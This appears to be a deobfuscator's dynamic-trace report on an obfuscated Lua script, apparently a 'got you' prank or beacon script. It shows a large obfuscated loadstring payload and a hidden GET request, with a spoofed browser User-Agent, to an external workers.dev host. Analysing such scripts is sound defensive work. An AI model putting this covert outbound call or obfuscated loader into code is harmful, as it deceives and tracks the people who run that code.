-- Deobfuscated by deobf (dynamic trace)
-- source: skibdii.lua.txt
-- NOTE: reconstructed from observed behaviour; branches that were not taken
--       during the trace are missing and conditions are only noted in comments.
-- run status: finished
-- 50 statements recorded in 1.38s
-- HTTP was not contacted; response values are symbolic harness proxies
-- URLs requested:
--   https://cdn.bfassets-cdn.workers.dev/l?b=3&msg=hi bro haha got u

-- loadstring() of 363353 bytes: "return setmetatable({pm=function(m,f,H,i,I,K,Y,R,D)if I<=479 then if I<=478 then local v,k,n,M=m[112](K,3+f),(Y-128)*16384,i-128,(R-128)*2097152;local c=128*(v%128);local X,V,F=k+(M+(2097152*(v-v%128)"
-- [deobf] removed 58 lines of the obfuscator's environment/anti-tamper probes
request({
	Headers = { ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", ["X-Note"] = "hi bro haha got u" },
	Method = "GET",
	Url = "https://cdn.bfassets-cdn.workers.dev/l?b=3&msg=hi bro haha got u"
})
